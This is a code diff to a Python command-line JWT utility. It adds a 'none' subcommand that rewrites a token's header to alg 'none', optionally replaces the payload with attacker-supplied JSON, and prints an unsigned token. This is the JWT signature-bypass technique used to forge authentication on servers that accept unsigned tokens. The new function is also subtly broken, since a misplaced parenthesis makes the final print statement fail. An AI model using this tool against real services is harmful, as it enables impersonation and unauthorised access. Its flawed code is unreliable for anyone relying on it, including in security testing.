@@ -50,11 +50,22 @@ def DECODE(args):
         i = tokenList.index(token)
         print("*"*50)
         print(f"The JWT {layout[i]} is:")
-        print(decodetoken(token))
+        if i != 2:
+            print(decodetoken(token))
+        else:
+            print("Secret")
         print("*"*50)
 
 def NONEALG(args):
-    print("nothing")
+    jwt_ = args.JsonWebToken
+    # Split token into separate parts
+    tokenList = splittoken(jwt_)
+    # Create none type header
+    new_header = base64.b64encode('{"typ":"JWT","alg":"none"}'.encode('ascii'))
+    if args.payload:
+        tokenList[1] = newpayload(args.payload)
+    # Return the base64 string stripping any padding
+    print(new_header.decode('ascii').replace('=','')+'.'+tokenList[1])+'.'
 
 def splittoken(token):
     # Split token into separate parts
@@ -126,6 +137,12 @@ def main():
     parser_decode = subparsers.add_parser('decode', help="Decode the JWT into its plain text components")
     parser_decode.add_argument('JsonWebToken', type=str, help='The full JWT that will be decoded')
     parser_decode.set_defaults(func=DECODE)
+
+    # Parse arguments for Decode function
+    parser_none = subparsers.add_parser('none', help="Converts algorithm type to none")
+    parser_none.add_argument('JsonWebToken', type=str, help='The full JWT that will be decoded')
+    parser_none.add_argument('-p', '--payload', type=json.loads, help='The JSON payload to replace in the JWT')
+    parser_none.set_defaults(func=NONEALG)
 
     args = parser.parse_args()
     args.func(args)
